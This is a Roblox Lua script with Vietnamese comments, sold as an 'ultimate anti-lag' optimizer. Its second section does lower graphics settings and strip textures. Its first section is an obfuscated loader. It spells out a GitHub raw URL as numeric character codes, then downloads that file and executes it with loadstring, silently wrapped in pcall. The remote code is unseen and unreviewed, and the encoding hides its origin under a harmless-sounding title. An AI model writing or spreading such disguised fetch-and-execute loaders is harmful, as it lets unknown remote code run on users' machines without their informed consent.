-- [[ FIXED & OBFUSCATED - ULTIMATE ANTI-LAG ]] --

-- 1. TẢI SCRIPT CHÍNH (Đã sửa mã hóa link chuẩn 100%)
task.spawn(function()
    pcall(function()
        local URL = string.char(
            104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,
            114,111,98,118,120,115,50,52,47,102,114,101,101,109,105,117,109,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,
            115,99,114,105,112,116,46,108,117,97
        )
        loadstring(game:HttpGet(URL))()
    end)
end)

-- 2. BỘ TỐI ƯU SIÊU GIẢM LAG (SAFE & COMPATIBLE)
task.spawn(function()
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
    end)

    local L = game:GetService("Lighting")
    L.GlobalShadows = false
    L.FogEnd = 9e9
    
    for _, v in ipairs(L:GetChildren()) do
        if v:IsA("PostEffect") or v:IsA("Atmosphere") or v:IsA("SunRaysEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") then
            v.Enabled = false
        end
    end

    local Ter = workspace:FindFirstChildOfClass("Terrain")
    if Ter then
        Ter.Decoration = false
        Ter.WaterWaveSize = 0
        Ter.WaterWaveSpeed = 0
        Ter.WaterReflectance = 0
    end

    local function AntiLag(v)
        if v:IsA("BasePart") and not v:IsDescendantOf(game:GetService("Players")) then
            v.CastShadow = false
            v.Material = Enum.Material.SmoothPlastic
            v.Reflectance = 0
        elseif v:IsA("Decal") or v:IsA("Texture") then
            v:Destroy()
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") or v:IsA("Beam") then
            v.Enabled = false
        elseif v:IsA("MeshPart") then
            v.Material = Enum.Material.SmoothPlastic
            v.Reflectance = 0
            v.TextureID = ""
        elseif v:IsA("SpecialMesh") then
            v.TextureId = ""
        end
    end

    for _, v in ipairs(workspace:GetDescendants()) do AntiLag(v) end
    workspace.DescendantAdded:Connect(AntiLag)
end)
